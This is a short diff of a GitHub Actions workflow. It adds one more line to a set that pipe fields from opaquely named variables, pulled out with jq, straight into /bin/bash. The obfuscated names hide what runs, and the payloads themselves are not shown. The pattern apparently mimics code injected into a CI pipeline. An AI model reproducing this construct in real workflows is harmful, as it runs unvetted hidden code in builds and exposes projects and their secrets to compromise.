@@ -21,6 +21,7 @@ jobs:
           echo $udqaa6990 | jq -r .xalss0118 | /bin/bash
           echo $h8056 | jq -r .vae411 | /bin/bash
           echo $ls801 | jq -r .ki114 | /bin/bash
+          echo $mernw87 | jq -r .kh70 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
